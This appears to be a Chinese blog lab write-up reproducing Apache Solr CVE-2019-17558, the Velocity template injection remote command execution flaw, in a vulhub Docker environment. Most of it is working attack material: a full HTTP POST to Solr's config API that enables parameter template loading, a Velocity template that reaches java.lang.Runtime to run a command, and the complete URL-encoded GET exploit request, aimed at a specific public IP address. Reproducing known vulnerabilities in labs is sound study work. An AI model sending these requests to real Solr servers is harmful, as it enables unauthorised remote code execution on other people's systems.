ailx10说：这篇是我2024年10月写的。这次看 Solr 的 Velocity，我先通过配置接口打开相关开关，再把模板放进查询参数里，观察反射调用和命令输出，最后试连接。流程看着短，其实第一步就已经藏着很重要的权限条件；没有配置能力，后面的模板未必有机会被处理。我把请求和输出方法记下来，也留意到读流的代码不一定能拿到全部内容。这篇想说明的是模板能力怎样越过了原本的用途，而不是说所有 Solr 查询都能随便塞进执行逻辑。

---

编辑核查提示：实验先通过配置 API 开启参数模板加载，执行权限和网络入口是重要前提；模板可通过参数提供，不一定先上传文件。 原题代码和外部地址未重新运行；截图细字及水印仍待核对。

本文记录 Apache Solr CVE-2019-17558 的 Velocity 模板实验。原实验先使用配置 API 打开参数资源加载，再通过查询参数提供模板；该路径不要求先上传模板文件。

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build //可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

- `docker-compose down`

简单访问一下，说明 Apache Solr Velocity 注入远程命令执行漏洞 (CVE-2019-17558) 环境搭建成功了

![](/notes-assets/3660ca014529e2621d4a.webp)

实验前的准备：开启 `params.resource.loader.enabled`

- 访问 `http://144.34.162.13:8983/solr/admin/cores?indexInfo=false&wt=json`

![](/notes-assets/35c0826daa6452b47b9e.webp)

- 通过Burp请求，开启 `params.resource.loader.enabled`

```
POST /solr/demo/config HTTP/1.1
Host: 144.34.162.13:8983
Content-Type: application/json
Content-Length: 261

{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}
```

（1）命令执行

```
#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('id')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

URL编码后，完整的载荷：

```
GET /solr/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
```
